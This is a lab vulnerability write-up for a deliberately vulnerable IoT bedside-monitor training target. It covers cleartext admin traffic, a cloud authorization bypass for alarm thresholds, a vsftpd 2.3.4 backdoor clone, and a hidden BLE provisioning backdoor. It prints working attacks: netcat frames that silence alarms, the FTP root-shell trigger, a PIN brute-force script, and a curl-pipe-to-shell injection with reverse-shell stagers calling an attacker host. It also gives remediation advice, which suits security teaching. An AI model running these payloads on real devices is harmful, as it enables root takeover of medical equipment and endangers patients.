---
id: IoT:I2
title: "Insecure Network Services"
category: IoT
status: DONE
severity: Critical
owasp: "IoT I2 — Insecure Network Services"
cwe: "CWE-1104 (Use of Unmaintained Third-Party Components) / CWE-912 (Hidden Functionality) / CWE-78 (OS Command Injection) / CWE-306 (Missing Authentication) / CWE-319 (Cleartext Transmission) / CWE-798 (Use of Hard-coded Credentials) / CWE-918 (Server-Side Request Forgery) / CWE-613 (Insufficient Session Expiration)"
source_docs:
  - "CareOtter_IoT.md §IoT:I2 (2.1 + 2.2 migrated)"
  - "stages/01_spec/output/IoT-I2-ftp-rce-spec.md (2.3)"
  - "CareOtter_IoT.md §IoT:I3 §3.4 + Vulns/Mobile/BLE-07 (2.4 migrated, re-classified)"
affected_components:
  - "labs/careotter/careservice.c"
  - "labs/careotter/files/opt/medical-sensor/sensor_service.py"
  - "labs/careotter/careotter-ftp.c"
  - "labs/careotter/files/etc/init.d/careotter-ftp"
  - "labs/careotter/files/usr/lib/vulnzoo-hooks/profile-init.d/72-careotter-ftp.sh"
  - "labs/careotter/files/usr/lib/vulnzoo-hooks/profile-init.d/75-firewall.sh"
  - "labs/careotter/files/opt/medical-sensor/ble_server.py"
verified_date: ""
---

# IoT:I2 — Insecure Network Services

> **Status:** DONE (§2.1 + §2.2 + §2.3 + §2.4 all DONE — §2.4 migrated from BLE-07)
> **OWASP:** IoT I2 — Insecure Network Services
> **CWE:** CWE-1104 / CWE-912 / CWE-78 / CWE-306 / CWE-319 / CWE-798 / CWE-918 / CWE-613
> **Severity:** Critical

---

## Why It Matters

The CareOtter bedside monitor is a device that sits on the patient's home WiFi and runs several network services to expose its medical functions. OWASP IoT I2 is about those services being unnecessary, unauthenticated, unencrypted, or running outdated software with known exploits. On a device that controls cardiac telemetry and therapy thresholds, a single exposed service is the difference between a monitored patient and a fully compromised implant gateway.

This device gets I2 wrong in four escalating ways: an admin protocol that ships secrets in cleartext (§2.1), an HTTP service whose life-safety threshold control is reachable through a Cloud API authorization flaw (§2.2), a forgotten legacy FTP daemon that hands an unauthenticated attacker a **root shell** (§2.3), and a hidden BLE factory-provisioning service that is the same root-shell backdoor reached over Bluetooth (§2.4). The firewall amplifies the first three, and the BLE backdoor needs no network reachability at all — only radio range.

---

## The exposed surface

The monitor's firewall hook (`75-firewall.sh`) is the force multiplier. It rebuilds `/etc/config/firewall` fully permissive on the WAN side — `input=ACCEPT`, masquerade and bidirectional `lan <-> wan` forwarding (the medical monitor acts as an open router) — and **pre-opens roughly fifteen medical and IoT service ports from the WAN with no daemon behind most of them**.

```sh
# 75-firewall.sh (excerpt) — every one of these is reachable from the home WiFi
add_rule 'Allow-SSH'    'tcp' '22'
add_rule 'Allow-Telnet' 'tcp' '23'
add_rule 'Allow-FTP'    'tcp' '21'          # <-- §2.3 lives here
add_rule 'Allow-SNMP'   'udp' '161 162'
add_rule 'Allow-MQTT'   'tcp' '1883 8883'
add_rule 'Allow-HL7'    'tcp' '2575'
add_rule 'Allow-DICOM'  'tcp' '104 11112'
add_rule 'Allow-Modbus' 'tcp' '502'
add_rule 'Allow-UPnP-SSDP' 'udp' '1900'
# … plus CoAP, mDNS, RTSP, NetBIOS/SMB …
```

An open port with no service is "merely" attack surface waiting to be filled. An open port with an outdated service is an exploit. The listening services today:

| Port | Protocol | Service | Auth | Sub-vector |
|------|----------|---------|------|-----------|
| 8081 | HTTP | `sensor_service.py` — vitals + thresholds | X-API-Key (hardcoded) | §2.2 |
| 9999 | TCP / IGP v4 | `careservice` — device administration | Hardcoded token, **cleartext** | §2.1 |
| 21 | FTP | `careotter-ftp` — vendor field-service FTP | **None** (backdoored release) | §2.3 |
| 22 | SSH | dropbear (base image) | **RootPasswordAuth on** | baseline (config smell) |
| 8080 | HTTP | uHTTPd Device Manager (base) | — (`rfc1918_filter 0`, CGI) | baseline |
| BLE | GATT | `ble_server.py` — hidden provisioning backdoor | **None** (factory-PIN bypass) | §2.4 |

> The careservice on `:9999` is itself an insecure network service with memory-corruption RCE (format string, integer-underflow stack overflow, command injection — see IoT:I7/I9). It is documented under code-quality, but it is textbook I2 too. This page focuses on the transport/auth/version failures of the surface as a whole.

---

## 2.1 — IGP admin service in cleartext (no transport encryption)

**Status:** DONE

The administration service listens on TCP `:9999` with no TLS. Every command — including the authentication token and the full WiFi configuration (SSID + PSK) — travels in cleartext over the link.

![[iot2_2.1_IGP.png]]

A passive observer on the `192.168.2.0/24` segment captures the admin token and the WiFi PSK with a single `tcpdump` session, then replays the token to take over administration.

## 2.2 — HTTP sensor service is API-key gated, and the threshold bypass is the Cloud API BFLA

**Status:** DONE

Port `:8081` exposes vitals, history, config and a `POST /thresholds` endpoint. Every endpoint except `/health` requires an `X-API-Key` header (`sensor_service.py` `_check_auth`), so a direct unauthenticated request to the device is rejected:

```bash
$ curl -s -X POST http://192.168.2.1:8081/thresholds \
    -H "Content-Type: application/json" \
    -d '{"bpm_min": 0, "bpm_max": 255, "spo2_min": 0}'
{"error": "unauthorized", "X-API-Key": "invalid"}
```

The auth is weak rather than absent. The key is a hardcoded factory value (`config.json` `api_key` = `careotter-2024-lab`) compared with a non-constant-time `==`, but it is enforced on every data and control endpoint.

Silencing the alarms does not happen on the device. It happens one layer up, at the Cloud API. `POST /api/config/thresholds` is guarded by the wrong decorator (`@token_required` instead of `@admin_required`), so a low-privilege patient JWT is accepted. This is Broken Function Level Authorization, documented in [[API5_Broken_Function_Level_Authorization.md]]. The Cloud API proxies the change to the device over IGP `0x08`, setting `bpm_min=0`, `bpm_max=255`, `spo2_min=0`:

```bash
$ JWT=$(curl -s -X POST http://api.careotter.lab/api/auth/login/patient \
    -H "Content-Type: application/json" \
    -d '{"username":"john_doe","password":"johnny123"}' | jq -r .token)

$ curl -s -X POST -H "Authorization: Bearer $JWT" \
    http://api.careotter.lab/api/config/thresholds \
    -d '{"bpm_min": 0, "bpm_max": 255, "spo2_min": 0}'
{"igp_request":"4341524508000009bb04000000ffcc0100","result":"THRESHOLD_SET","thresholds":{"bpm_max":255,"bpm_min":0,"spo2_min":0}}
```

Disabling every clinical alarm with nothing but a patient token is a direct patient-safety risk. In vulnerable mode the response also leaks the raw `igp_request` frame, which chains into the API4 IGP flood (see `API5` Step 4).

### The cloud BFLA and the device-side risk are two separable controls

The threshold change above is two independent failures on two layers, and fixing one does not fix the other.

1. **Cloud authorization (API5, the BFLA).** The Cloud API let a patient reach an admin-only function. Correcting the decorator to `@admin_required` closes the patient path, but it changes nothing on the device.
2. **Device trust (the IoT risk on this page).** The device-side threshold setter is the careservice IGP `0x08 SET_THRESHOLD` command. Its only gate is the global hardcoded admin token (`OtterMobile2026`, see [[IoT1_Weak_Guessable_Hardcoded_Passwords]]) presented once over the cleartext `:9999` channel (§2.1). The device performs no verification that the bytes reflect a current, authorized decision by a cloud-authenticated user. It writes whatever thresholds arrive from anyone who can speak IGP with that token.

Because the device trusts the channel and not the request, the cloud BFLA is only one path to it. An attacker who never touches the Cloud API, just the leaked IGP token and LAN access to `:9999`, sets the same lethal thresholds directly (the exact frame the Cloud API leaked in its `igp_request`):

```bash
# Authenticate to careservice with the hardcoded token, then SET_THRESHOLD (0x08).
printf '\x43\x41\x52\x45\x02\x00\x00\x0fOtterMobile2026'                 | nc -w2 192.168.2.1 9999
printf '\x43\x41\x52\x45\x08\x00\x00\x09\xbb\x04\x00\x00\x00\xff\xcc\x01\x00' | nc -w2 192.168.2.1 9999
```

So a cloud with a perfectly correct authorization model would still ship a forwarded command to a device that cannot tell the difference, and a perfectly hardened device would still be reachable through the cloud BFLA. They are separate controls, and both are needed.

### What the device service must do to trust a "cloud-authenticated" request

The device cannot delegate all authentication and authorization to the cloud and then trust whatever bytes arrive. To be sure a control command reflects a real, current, authorized cloud user, the device-side service should require the request to carry and prove that authorization, not infer it from the channel:

- **Per-device, rotatable credentials, not a global static token.** Replace the single hardcoded `OtterMobile2026` (identical on every unit, recoverable with `strings`) with a unique key per device that can be revoked and rotated. A shared secret authenticates "someone who has the secret", never "this specific authorized user".
- **A verifiable, scoped authorization artifact per command.** The cloud signs each control command (or issues a short-lived, single-use capability token) with a key the device verifies. The artifact binds the command to the authenticated user's identity and role, to the specific action (set thresholds), and to the target device. The device checks the signature before acting, so a command the cloud should never have authorized carries no valid artifact and is rejected.
- **Mutual authentication of the channel (mTLS).** The device accepts control traffic only from the genuine cloud, and the cloud only from the genuine device. A LAN attacker cannot present a valid cloud certificate, which also closes the direct-IGP path.
- **Anti-replay binding.** Include a nonce, timestamp or sequence number in the signed command so a captured frame cannot be replayed to re-apply lethal thresholds later.
- **Treat network position as untrusted.** "It arrived over IGP from the LAN" is not evidence of authorization. Fail closed when the artifact is missing or invalid.

With these in place the device no longer trusts the cloud's authorization decision blindly. A cloud-side authorization bug cannot silently become a device action, because the device independently verifies that this command was authorized for this action by an authenticated user, and any breach is bounded and auditable.

## 2.3 — Legacy FTP daemon with public RCE (vsftpd 2.3.4 backdoor)

**Status:** DONE

The firewall opens `:21` (`Allow-FTP`), and a vendor "field-service" FTP daemon — the kind real monitors and pumps ship for firmware and log transfer and leave enabled in the field — listens there as **root**. It advertises a years-old version, so one `nmap -sV` hands the attacker a public remote-root exploit.

![[iot2_nmap_ftp.png]]

`vsftpd 2.3.4` is the backdoored 2011 release (CVE-2011-2523). An FTP `USER` argument containing the smiley `:)` makes the daemon bind `/bin/sh` to TCP `:6200`. Because the service runs as root, the shell is **root** — unauthenticated remote code execution on the device that governs the patient's cardiac telemetry and therapy thresholds.

In this particular case, the backdoor found its way into the official source as a result of a supply chain compromise. Between June 30th and July 3rd, 2011, the master download site distributed a tampered `vsftpd-2.3.4.tar.gz` that contained malicious code not present in the author's repository. An attacker with access to the project's distribution server injected a patch into `str.c` that checked if the FTP `USER` argument had `:)`. The trojaned tarball was live for 72 hours until vsftpd's author Chris Evans discovered the intrusion.

In the CareOtter lab, `careotter-ftp.c` is a faithful re-implementation of that same backdoor logic. It advertises `vsftpd 2.3.4` in the banner, parses the `:)` trigger in the username, and spawns a root shell on `:6200`.

```bash
# 1) Trigger the backdoor on the FTP control channel
$ nc 192.168.2.1 21
220 (vsFTPd 2.3.4)
USER pwn:)
331 Please specify the password.
PASS x
230 Login successful.

# 2) Catch the root shell on :6200
$ nc 192.168.2.1 6200
id
uid=0(root) gid=0(root)
```

![[iot2_2.3_ftp_rce.png]]

From that root shell the attacker reads `/etc/config/wireless` (WiFi PSK), rewrites `/tmp/careotter.thresholds` to silence clinical alerts, tampers the `careservice` and sensor processes, or pivots to the Cloud API over the home WiFi. A forgotten, unmaintained network service on an internet-adjacent medical device is one nmap away from full compromise.

In the lab the daemon is a faithful re-implementation of the backdoor (`labs/careotter/careotter-ftp.c`), shipped as a prebuilt aarch64 binary like `careservice` and started by `72-careotter-ftp.sh` on `START=72`. The binary is not stripped, so `nmap -sV` and `strings(1)` reveal the `vsFTPd 2.3.4` version lure.
### Secure mode

The I2 remediation is to **remove** the unnecessary service, not to "patch it later". With UCI `careotter.@careotter[0].ftp_secure=1` the init script does not start `careotter-ftp` — nothing listens on `:21` and the exploit has no target. The toggle mirrors `careservice`'s `secure_mode`.

---

## 2.4 — Hidden BLE factory-provisioning service (administrative backdoor → root RCE)

**Status:** DONE

This is the BLE counterpart of the §2.3 FTP backdoor: a hidden, unauthenticated service the device exposes on its own radio, gated only by a hard-coded factory PIN, that hands an attacker in Bluetooth range root code execution, the WiFi PSK, and the ability to repoint the device's cloud. Like the vsftpd daemon in §2.3 it is hidden functionality on a device service (CWE-912), which is why it is filed here under Insecure Network Services rather than on the BLE leak pages.

The full write-up below is migrated verbatim (code, commands and screenshots) from the standalone `BLE-07` document and `CareOtter_IoT.md` §3.4. Its embedded OWASP-classification table has been corrected from the original (which led with Mobile M3 / IoT I3) to match this page: the exploit drives `bluetoothctl`/`bleak` straight at the device and never touches the mobile app, so the primary lens is the insecure on-device service (I2 / CWE-912), with the hard-coded PIN (I1/I9), the plaintext PSK read (see [[IoT6_Insufficient_Privacy_Protection]]) and the `cloud_set` SSRF reaching the real cloud (I3, Chain F only) as contributing facets. The two passive BLE leaks and the CSCP threshold-forging DoS that used to sit beside this case are now [[IoT6_Insufficient_Privacy_Protection]] (§3.1/3.2) and [[IoT7_Insecure_Data_Transfer_and_Storage]] (§3.3).

### Why It Matters

CareOtter exposes a **secondary GATT service (`0xFF10`)** that is intentionally omitted from the BLE advertising packet. The manufacturer intended this channel for clinical technicians to perform initial bedside-monitor configuration (WiFi SSID/PSK, Cloud API endpoint) before the device has network connectivity. Because it is not listed in `Advertisement.ServiceUUIDs`, the manufacturer assumed it would remain invisible to patients and attackers — a classic *security through obscurity* design.

However, BLE requires every connected client to perform full GATT service discovery. Any standard BLE scanner (nRF Connect, `bluetoothctl`, `gatttool`, or `bleak`) enumerates **all** services after connection, making `0xFF10` trivially discoverable.

The service exposes two characteristics:

| Characteristic      | UUID     | Flags               | Function               |
| ------------------- | -------- | ------------------- | ---------------------- |
| Provisioning Config | `0xFF11` | read, write, notify | JSON command interface |
| Provisioning Auth   | `0xFF12` | read, write         | 4-digit factory PIN    |

**Manufacturer claim:** the channel auto-disables 30 minutes after first power-on.
**Reality (`ble_server.py`):** `initialized_at` is recorded but never compared against `time.time()`. The channel remains active indefinitely (**P8**).

---

### OWASP Classification

| Category | Role |
|---|---|
| **I2 — Insecure Network Services** | Primary — hidden, unauthenticated on-device BLE provisioning service (`0xFF10`, `ble_server.py`) reachable over the device's own radio without pairing → root RCE via `wifi_set` shell injection (CWE-912 / CWE-78) |
| **I9 — Insecure Default Settings** | Secondary — hardcoded factory PIN `6767`, decorative attempt counter with no lockout, `authenticated` flag with no expiration |
| **I6 — Insufficient Privacy Protection** | Tertiary — plaintext PSK disclosure via `ReadValue` (see [[IoT6_Insufficient_Privacy_Protection]]) |
| **I3 — Insecure Ecosystem Interfaces** | Contributing — Chain F only: the `cloud_set` redirect repoints the device to an attacker server, captures the factory signature, and replays it to the real Cloud API (CWE-918). The provisioning interface itself is on the device, so this is downstream chained impact, not the locus of the defect. |

---

### Complete Attack Chain

The walk-through uses **`bluetoothctl`**, the standard BlueZ interactive client available on any modern Linux distribution.

> **Precondition — set the attacker's BlueZ host to LE-only mode.**
>
> By default `bluetoothd` runs in `dual` mode (BR/EDR + LE). After a successful LE GATT
> connection, `bluetoothctl connect` will additionally attempt to open a classic
> BR/EDR profile (A2DP, AVRCP, HFP, …). Because `CareOtter_HR` is LE-only and exposes
> no classic profile, BlueZ raises
>
> ```text
> Failed to connect: org.bluez.Error.BREDR.ProfileUnavailable
>     No more profiles to connect to
> ```
>
> and tears the LE link down immediately after `ServicesResolved: yes`, before
> the operator can run `menu gatt` / `list-attributes`. This is a well-known
> BlueZ behaviour with LE-only peripherals — **not** a CareOtter vulnerability.
>
> Switch the host adapter to LE-only **once** before starting the chain:
>
> ```bash
> sudo sed -i 's/^#ControllerMode = dual$/ControllerMode = le/' /etc/bluetooth/main.conf
> sudo systemctl restart bluetooth
> ```
>
> After the restart, `bluetoothctl show` should list only `Generic Access`,
> `Generic Attribute` and `Device Information` UUIDs — every BR/EDR UUID
> (`A/V Remote Control`, `Audio Sink`, `Handsfree Audio Gateway`, …) must be
> gone. Revert with `ControllerMode = dual` if you later need classic Bluetooth
> on the same host (audio headsets, etc.).
>
> Alternatives that bypass this entirely without touching `main.conf`: use
> [`bleak`](https://github.com/hbldh/bleak) (LE-pure Python) or `gatttool -t random`
> (deprecated but still LE-only).

#### Step 1 — Connect and enumerate GATT services (P1)

> **Prerequisite — lower the BlueZ discovery filter before `scan on`.**
>
> BlueZ default `DiscoveryFilter` rejects adv reports below ≈−80 dBm and collapses
> duplicate packets. The Pi BCM4345C0 with PCB antenna typically arrives at −85 dBm
> in the lab, so `bluetoothctl` shows nothing even when `sudo btmon` already sees
> `Name (complete): CareOtter_HR` at the HCI layer. Set a permissive filter once
> per session before scanning:
>
> ```text
> bluetoothctl
> [bluetooth]# menu scan
> [bluetooth]# transport le
> [bluetooth]# rssi -100
> [bluetooth]# duplicate-data on
> [bluetooth]# pattern CareOtter
> [bluetooth]# back
> [bluetooth]# scan on
> ```
>
> After `[NEW] Device 43:45:C0:00:1F:AC CareOtter_HR` appears, `scan off` and
> continue with `connect`.

```bash
$ bluetoothctl
[bluetooth]# connect 43:45:C0:00:1F:AC
Attempting to connect to 43:45:C0:00:1F:AC
Connection successful
[CareOtter_HR]# menu gatt
Menu gatt:
...
[CareOtter_HR]# list-attributes
```

![Connection to CareOtter_HR via bluetoothctl](../../IoT/images/hidden-backdoor-connect-careotter.png)

`list-attributes` reveals a **Secondary Service** that was never advertised:

![Hidden 0xFF10 service exposed by GATT discovery](../../IoT/images/ble-08-unknown-characteristics.png)

The hidden provisioning service (`0xFF10`) and its two characteristics (`0xFF11`, `0xFF12`) are fully visible to any connected client.

---

#### Step 2 — Probe the gated config + read the auth status (P3)

Select the Config characteristic (`0xFF11` / `char0044`) and read its current value:

![Read of 0xFF11 returns PIN_REQUIRED](../../IoT/images/hidden-backdoor-pin-required.png)

```bash
[CareOtter_HR]# select-attribute /org/bluez/hci0/dev_43_45_C0_00_1F_AC/service0043/char0044
[CareOtter_HR:/service0043/char0044]# read
Attempting to read /org/bluez/hci0/dev_43_45_C0_00_1F_AC/service0043/char0044
[CHG] Attribute ... Value:
  7b 22 65 72 72 6f 72 22 3a 20 22 50 49 4e 5f 52  {"error": "PIN_R
  45 51 55 49 52 45 44 22 7d                       EQUIRED"}
```

Decoded:

```json
{"error": "PIN_REQUIRED"}
```

`ProvisioningConfigChrc.ReadValue` is gated on `_provisioning_state["authenticated"]` — until the PIN has been verified in Step 3, the read returns this stub instead of the provisioning state. The server simultaneously logs `[BLE] Provisioning read rejected — PIN not verified`. The plaintext `wifi_ssid` / `wifi_psk` / `cloud_url` (P5, CWE-312) is *not* leaked pre-PIN; it surfaces in Step 4b below once the gate is open.

Now read the Auth characteristic (`0xFF12` / `char0047`) — this one is **not** gated, by design, so an attacker can observe the brute-force counter:

![Read of 0xFF12 exposes the attempts counter](../../IoT/images/auth-characteristic.png)

```bash
[CareOtter_HR:/service0043/char0044]# select-attribute /org/bluez/hci0/dev_43_45_C0_00_1F_AC/service0043/char0047
[CareOtter_HR:/service0043/char0047]# read
Attempting to read /org/bluez/hci0/dev_43_45_C0_00_1F_AC/service0043/char0047
[CHG] Attribute ... Value:
  7b 22 61 74 74 65 6d 70 74 73 5f 72 65 6d 61 69  {"attempts_remai
  6e 69 6e 67 22 3a 20 33 2c 20 22 6c 6f 63 6b 65  ning": 3, "locke
  64 22 3a 20 66 61 6c 73 65 7d                    d": false}
```

Decoded:

```json
{"attempts_remaining":3, "locked":false}
```

The device exposes a **guess counter with no permanent lockout mechanism** (`locked: false`). An attacker can brute-force the 4-digit PIN indefinitely — the counter just rolls over.

---

#### Step 3 — Bypass authentication (P2, P3) — MANDATORY before any 0xFF11 write

No BLE pairing or bonding is required. The factory PIN is hardcoded to `6767` across all devices (4 ASCII digits → `0x36 0x37 0x36 0x37`). Write it to `0xFF12`:

![PIN bypass — writing 6767 to 0xFF12](../../IoT/images/bypass-authenticatino.png)

```bash
[CareOtter_HR:/service0043/char0047]# write "0x36 0x37 0x36 0x37"
```

After the write, re-`read` the same characteristic to confirm acceptance — on a correct PIN the server resets `pin_attempts=0` internally, so the displayed `attempts_remaining` returns to `3`:

```bash
[CareOtter_HR:/service0043/char0047]# read
# {"attempts_remaining": 3, "locked": false}
```

##### Brute force — when the PIN has not been pre-extracted from firmware

If the attacker has no firmware access, the 10 000-PIN space is fully sweepable from BLE range because `ProvisioningAuthChrc.WriteValue` accepts every attempt regardless of the counter — `locked` is a hardcoded literal `False` and the displayed `attempts_remaining` is the cyclic expression `max(0, 3 - (pin_attempts % 3))`, which hides the real attempt count from the client (CWE-358).

The following `bleak` script iterates `0000..9999` writing each candidate to `0xFF12`. Success detection is delegated to an out-of-band SSH watcher on the device log because the BLE-side `Value`/`ReadValue` carry **no observable indicator** that a client can distinguish from the modulo collision at every third failure:

```python
#!/usr/bin/env python3
"""CareOtter PIN brute force via bleak.

Iterates 0000..9999, writing each candidate to the Provisioning Auth
characteristic (0xFF12). Detection: an external watcher tails
/var/log/ble_server.log on the device over SSH and writes the matched line
to /tmp/careotter_pin_found; this script polls that sentinel file and
stops as soon as it is non-empty.

Empirical run on the lab: PIN 6767 reached in attempt #6768 in ~10 min.
"""
import asyncio
import os
import sys
import time

from bleak import BleakClient

TARGET    = "43:45:C0:00:1F:AC"
AUTH_UUID = "0000ff12-0000-1000-8000-00805f9b34fb"
SIGNAL    = "/tmp/careotter_pin_found"


async def brute():
    async with BleakClient(TARGET, timeout=20.0) as c:
        # Resolve the auth char by exact object reference rather than UUID
        # to avoid "Multiple Characteristics with this UUID" when stale
        # ble_server.py instances are still registered in BlueZ.
        auth_chr = None
        for svc in c.services:
            for ch in svc.characteristics:
                if ch.uuid == AUTH_UUID:
                    auth_chr = ch
                    break
            if auth_chr:
                break
        if auth_chr is None:
            print("[-] auth char not found"); return
        print(f"[+] Connected. Auth char: handle={auth_chr.handle}")

        start = time.perf_counter()
        for n in range(10_000):
            pin = f"{n:04d}"
            try:
                await c.write_gatt_char(auth_chr, pin.encode(), response=True)
            except Exception as e:
                print(f"[-] write failed at {pin}: {e}")
                await asyncio.sleep(0.1)
                continue

            if os.path.exists(SIGNAL) and os.path.getsize(SIGNAL) > 0:
                with open(SIGNAL) as f:
                    print(f"[+] Signal: {f.read().strip()}")
                print(f"[+] Last PIN written: {pin}")
                elapsed = time.perf_counter() - start
                print(f"[+] {n+1} attempts in {elapsed:.1f}s "
                      f"({(n+1)/elapsed:.1f}/s)")
                return

            if n % 200 == 0 and n > 0:
                elapsed = time.perf_counter() - start
                rate = n / elapsed
                eta = (10000 - n) / rate
                print(f"[*] {pin}  rate={rate:.1f}/s  eta={eta:.0f}s")

        print("[-] Exhausted 10 000 PINs without success")


if __name__ == "__main__":
    try:
        asyncio.run(brute())
    except KeyboardInterrupt:
        sys.exit(1)
```

Run the script together with the SSH watcher that creates the sentinel:

```bash
# 1) Watcher: tails the device log, fills the sentinel on AUTH success
rm -f /tmp/careotter_pin_found
( ssh root@192.168.2.1 \
    "tail -n0 -F /var/log/ble_server.log | grep --line-buffered -m1 'AUTH success'" \
    > /tmp/careotter_pin_found ) &

# 2) Brute force in the foreground
python3 careotter_pin_brute.py
```

**Empirical timeline observed on the lab** (Cypress BCM43430 on the Pi + bleak + BlueZ 5.x on Kali):

```
line   25:  [BLE] Provisioning AUTH failed (PIN=0000, attempts=1)      ← start
line 6850:  [BLE] Provisioning AUTH failed (PIN=6764, attempts=6765)
line 6851:  [BLE] Provisioning AUTH failed (PIN=6765, attempts=6766)
line 6852:  [BLE] Provisioning AUTH failed (PIN=6766, attempts=6767)   ← last failure
line 6853:  [BLE] Provisioning AUTH success                            ← PIN=6767 accepted
line 6854:  [BLE] Provisioning AUTH failed (PIN=6768, attempts=1)      ← server reset confirmed
```

**6 767 failed writes** were accepted by `WriteValue` before the correct PIN, **zero** were rejected by the (decorative) attempts counter, and the counter reset to `1` on the very next failed write — proving the only state mutation the server performs on success is `pin_attempts = 0`. Wall-clock cost: ~10 min on this rig (~11 writes/s). On a faster radio + adapter combination this collapses to ~100 s worst case for the entire 10 000 space.

---

`ProvisioningConfigChrc.WriteValue` now enforces this gate strictly: it checks `_provisioning_state["authenticated"]` at entry and silently drops any command (logging `"[BLE] Provisioning command rejected — PIN not verified"`) until a correct PIN write has flipped that flag to `True`. **Steps 4, 5 and 6 below all depend on Step 3 having succeeded first.**

The PIN gate is **not** what makes this exploitable — the underlying weaknesses are:

| Weakness | Consequence |
|---|---|
| **CWE-798** — PIN hardcoded factory-wide (`PROV_PIN_FACTORY = "6767"`, identical on every device) | `strings /opt/medical-sensor/ble_server.py \| grep PROV_PIN_FACTORY` recovers it; one write bypasses the gate. |
| **CWE-307** — `ProvisioningAuthChrc` counts failed attempts but **never permanently locks**; the counter only modulates the JSON `attempts_remaining` field and resets on success | If the PIN were not already public, the entire 4-digit space (10 000 combinations × ~10 ms BLE latency ≈ 100 s worst-case) is fully brute-forceable from BLE range with no observable defensive response. |
| **CWE-613** — `_provisioning_state["authenticated"]` never auto-clears (P8 unchanged) | Once true, it stays true until the BLE service restarts, so a single successful PIN write keeps the gate open indefinitely for the rest of the chain. |

After this step, the attacker holds `authenticated=True` and every subsequent `0xFF11` write executes.

---

#### Step 4 — Remote Code Execution via shell injection (P4) — *requires Step 3*

The `wifi_set` command in `ble_server.py` interpolates SSID and PSK directly into an `os.system()` call without escaping shell metacharacters:

```python
os.system(f"uci set wireless.@wifi-iface[0].ssid='{ssid}' && ...")
```

Prepare the malicious payload:

![RCE payload — wifi_set with shell metacharacters](../../IoT/images/hidden-backdoor-rce-payload.png)

```bash
$ PAYLOAD='{"cmd":"wifi_set","ssid":"'\''; curl http://attacker/r.sh | sh #","psk":"x"}'
$ HEX=$(echo -n "$PAYLOAD" | xxd -ps)
$ echo "$HEX"
7b22636d64223a22776966695f736574222c2273736964223a22...
$ echo "$HEX" | sed 's/../0x& /g; s/ $//'| tr -d '\n'
```

`r.sh` example:

```bash
#!/bin/ash
rm /tmp/f
mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.2.2 9001 > /tmp/f
```

Write it to `0xFF11` (char0044):

![RCE write — payload sent to 0xFF11](../../IoT/images/hidden-backdoor-rce.png)

```bash
[CareOtter_HR:/service0043/char0047]# select-attribute /org/bluez/hci0/dev_43_45_C0_00_1F_AC/service0043/char0044
[CareOtter_HR:/service0043/char0044]# write 0x7b 0x22 ...   # full hex string of payload
```

This executes as **root** on the bedside monitor:

![RCE success — root reverse shell from the Pi](../../IoT/images/hidden-backdoor-rce-success.png)

```bash
uci set wireless.@wifi-iface[0].ssid=''; curl http://attacker/r.sh | sh #' && ...
```

##### Attacker-side setup — verifying remote code execution

The `r.sh` referenced in the payload is a one-line reverse-shell stager hosted on the attacker's machine. The goal is to **prove** the injection ran by getting an interactive root shell from the Pi back to the attacker — no clinical effect on the device, just a TCP callback.

**1. On the attacker's host, create `r.sh`:**

```bash
cat > /tmp/r.sh <<'EOF'
#!/bin/sh
# Reverse shell back to the attacker.
# 192.168.2.100 = attacker, 4444 = listener port. Adjust to your lab subnet.
ATTACKER_IP=192.168.2.100
ATTACKER_PORT=4444

# OpenWRT ships BusyBox `nc` which does NOT support `-e`. The portable
# trick is a named-pipe loop that wires /bin/sh's stdio to a TCP socket.
mkfifo /tmp/.f 2>/dev/null
cat /tmp/.f | /bin/sh -i 2>&1 | nc "$ATTACKER_IP" "$ATTACKER_PORT" > /tmp/.f
rm -f /tmp/.f

# Side-evidence: also drop a marker file so you can confirm execution even
# if the reverse shell is blocked by the firewall hook (75-firewall.sh).
echo "pwned by $(id) at $(date)" > /tmp/careotter_rce_marker
EOF
chmod +x /tmp/r.sh
```

**2. Serve `r.sh` on a plain HTTP server reachable from the Pi:**

```bash
cd /tmp && python3 -m http.server 80
# Serving HTTP on 0.0.0.0 port 80 ...
```

**3. Open the listener that will catch the reverse shell:**

```bash
# In a separate terminal on the attacker host
nc -lvnp 4444
# listening on [any] 4444 ...
```

**4. Trigger the BLE write from Step 4 above** — the SSID field interpolates `'; curl http://192.168.2.100/r.sh | sh #` into `os.system()`, the Pi fetches and executes `r.sh` as **root**, and:

- The Python HTTP server logs `192.168.2.1 - - [..] "GET /r.sh HTTP/1.1" 200 …` → confirms the Pi reached out and downloaded the stager.
- The `nc -lvnp 4444` window prints `connect to [192.168.2.100] from … 192.168.2.1` and drops you into a `#` prompt running as root on the bedside monitor.

**5. Verify on the reverse shell:**

```sh
# On the catched shell
id
# uid=0(root) gid=0(root) groups=0(root)

uname -a
# Linux OpenWrt 6.6.x ... aarch64 GNU/Linux

cat /tmp/careotter_rce_marker
# pwned by uid=0(root) gid=0(root) groups=0(root) at Mon May 13 ...

# Reach the careservice admin port from inside the device — no auth needed now
nc -w1 127.0.0.1 9999 < /dev/null
```

> **If the reverse shell fails to connect but `/tmp/careotter_rce_marker` exists on the Pi**, the injection itself succeeded — the failure is purely network reachability (typically the `75-firewall.sh` hook on the Pi or NAT between the two hosts). In that case, validate RCE by reading the marker out-of-band: `ssh root@192.168.2.1 'cat /tmp/careotter_rce_marker'`. The marker is the minimal, firewall-independent proof that arbitrary code ran as root via the BLE provisioning channel.

---

#### Step 4b — Re-read 0xFF11 post-PIN: plaintext PSK leak (P5) — *requires Step 3*

Repeating the `read` from Step 2 now returns the **real** provisioning state instead of the `PIN_REQUIRED` stub. The PSK still travels in cleartext (CWE-312 — Plaintext Storage of Sensitive Information):

```bash
[CareOtter_HR:/service0043/char0044]# read
[CHG] Attribute ... Value:
  7b 22 77 69 66 69 5f 73 73 69 64 22 3a 20 22 22  {"wifi_ssid": ""
  2c 20 22 77 69 66 69 5f 70 73 6b 22 3a 20 22 22  , "wifi_psk": ""
  2c 20 22 63 6c 6f 75 64 5f 75 72 6c 22 3a 20 22  , "cloud_url": "
  68 74 74 70 3a 2f 2f 31 39 32 2e 31 36 38 2e 32  http://192.168.2
  2e 32 3a 35 30 30 32 22 2c 20 22 75 70 74 69 6d  .2:5002", "uptim
  65 5f 73 65 63 22 3a 20 33 33 30 37 2c 20 22 70  e_sec": 3307, "p
  72 6f 76 69 73 69 6f 6e 5f 65 78 70 69 72 65 64  rovision_expired
  22 3a 20 66 61 6c 73 65 7d                       ": false}
```

Decoded:

```json
{"wifi_ssid":"", "wifi_psk":"",
 "cloud_url":"not_configured",
 "uptime_sec":3307, "provision_expired":false}
```

